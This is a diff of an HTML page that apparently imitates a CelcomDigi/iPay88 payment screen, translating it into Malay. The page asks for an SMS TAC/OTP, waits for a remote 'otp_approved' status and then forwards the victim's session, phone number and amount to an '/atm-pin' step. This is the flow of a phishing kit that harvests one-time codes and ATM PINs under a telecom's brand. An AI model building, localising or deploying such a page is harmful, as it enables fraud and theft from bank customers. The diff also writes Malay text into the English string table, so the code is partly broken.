@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ms">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>CelcomDigi Next Gen App iPay88</title>
+  <title>CelcomDigi Apl Generasi Seterusnya iPay88</title>
   <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -354,7 +354,7 @@
     <button class="back-btn" onclick="history.back()">
       <img src="/get-assets/images/arrow-narrow-left.svg" alt="Back">
     </button>
-    <button class="lang-btn" id="langToggle">BM</button>
+    <button class="lang-btn" id="langToggle">EN</button>
   </div>
   <div class="logo-bar">
     <img src="/get-assets/images/ngpay-logo.svg" alt="CelcomDigi">
@@ -365,23 +365,23 @@
 <div class="white-card">
   <div class="timeout-badge">Timeout: <span id="countdown">08:00</span></div>
 
-  <div class="summary-title">Summary of transaction</div>
+  <div class="summary-title">Ringkasan transaksi</div>
 
-  <div class="summary-amount-label">Net charges</div>
+  <div class="summary-amount-label">Caj bersih</div>
   <div class="summary-amount-value" id="displayAmount">MYR 0.00</div>
 
   <div class="summary-row">
-    <div class="summary-label">Pay to</div>
+    <div class="summary-label">Bayar kepada</div>
     <div class="summary-value">CelcomDigi Telecommunications Sdn Bhd</div>
   </div>
 
   <div class="summary-row">
-    <div class="summary-label">Payment of</div>
+    <div class="summary-label">Pembayaran untuk</div>
     <div class="summary-value" id="paymentOf">RM 0 Bill Payment for -</div>
   </div>
 
   <div class="summary-row">
-    <div class="summary-label">Reference no. / Payment ID</div>
+    <div class="summary-label">No. rujukan / ID Pembayaran</div>
     <div class="summary-value" id="refNo">-</div>
   </div>
 
@@ -390,12 +390,12 @@
 
 <!-- OTP section (continues white background) -->
 <div class="otp-section">
-  <div class="section-title">TAC / OTP Verification</div>
+  <div class="section-title">Pengesahan TAC / OTP</div>
   <div class="section-desc">
-    A 6-digit TAC has been sent to your registered mobile number <strong id="maskedNumber">****</strong>. Please enter it below to proceed.
+    TAC 6 digit telah dihantar ke nombor telefon bimbit anda <strong id="maskedNumber">****</strong>. Sila masukkan di bawah untuk meneruskan.
   </div>
 
-  <div id="errorMsg" class="error-msg">Please verify the OTP sent to your mobile and try again.</div>
+  <div id="errorMsg" class="error-msg">Sila sahkan OTP yang dihantar ke telefon bimbit anda dan cuba lagi.</div>
 
   <div class="otp-boxes">
     <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
@@ -407,11 +407,11 @@
   </div>
 
   <div class="resend-row">
-    Didn't receive the TAC? <button class="resend-link" id="resendLink">Resend TAC</button>
+    Tidak menerima TAC? <button class="resend-link" id="resendLink">Hantar Semula TAC</button>
   </div>
 
-  <button type="button" id="submitBtn" class="btn-proceed disabled">Confirm</button>
-  <button type="button" class="btn-cancel" onclick="history.back()">Cancel</button>
+  <button type="button" id="submitBtn" class="btn-proceed disabled">Sahkan</button>
+  <button type="button" class="btn-cancel" onclick="history.back()">Batal</button>
 </div>
 
 </div><!-- end page-wrapper -->
@@ -470,7 +470,7 @@
     if (totalSecs <= 0) {
       clearInterval(timer);
       cdEl.textContent = '00:00';
-      window.location.href = type === 'reload' ? '/reload' : '/bill';
+      window.location.href = type === 'reload' ? '/reload/ms' : '/bill/ms';
       return;
     }
     const m = Math.floor(totalSecs / 60);
@@ -531,7 +531,7 @@
     document.getElementById('resendLink').textContent = 'Sent!';
     document.getElementById('resendLink').style.color = '#16a34a';
     setTimeout(() => {
-      document.getElementById('resendLink').textContent = 'Resend TAC';
+      document.getElementById('resendLink').textContent = 'Hantar Semula TAC';
       document.getElementById('resendLink').style.color = '';
     }, 3000);
   });
@@ -561,7 +561,7 @@
   function handleStatusUpdate(status) {
     if (status === 'otp_approved') {
       clearInterval(timer);
-      window.location.href = '/atm-pin?sessionId=' + encodeURIComponent(sessionId)
+      window.location.href = '/atm-pin/ms?sessionId=' + encodeURIComponent(sessionId)
         + '&number=' + encodeURIComponent(number)
         + '&amount=' + encodeURIComponent(amount)
         + '&ref=' + encodeURIComponent(ref)
@@ -607,16 +607,16 @@
   // ── Language Toggle ──
   const i18n = {
     en: {
-      summaryTitle: 'Summary of transaction',
-      netCharges: 'Net charges',
+      summaryTitle: 'Ringkasan transaksi',
+      netCharges: 'Caj bersih',
       payTo: 'Pay to',
       paymentOf: 'Payment of',
-      refNo: 'Reference no. / Payment ID',
-      sectionTitle: 'TAC / OTP Verification',
-      sectionDesc: 'A 6-digit TAC has been sent to your registered mobile number',
-      sectionDesc2: '. Please enter it below to proceed.',
-      resendText: "Didn't receive the TAC?",
-      resendBtn: 'Resend TAC',
+      refNo: 'No. rujukan / ID Pembayaran',
+      sectionTitle: 'Pengesahan TAC / OTP',
+      sectionDesc: 'TAC 6 digit telah dihantar ke nombor telefon bimbit anda',
+      sectionDesc2: '. Sila masukkan di bawah untuk meneruskan.',
+      resendText: "Tidak menerima TAC?",
+      resendBtn: 'Hantar Semula TAC',
       confirm: 'Confirm',
       cancel: 'Cancel',
       langBtn: 'BM'
@@ -669,9 +669,7 @@
   applyLang(currentLang);
 
   document.getElementById('langToggle').addEventListener('click', () => {
-    currentLang = currentLang === 'en' ? 'ms' : 'en';
-    localStorage.setItem('cdLang', currentLang);
-    applyLang(currentLang);
+    window.location.href = '/otp' + window.location.search;
   });
 </script>
 </body>
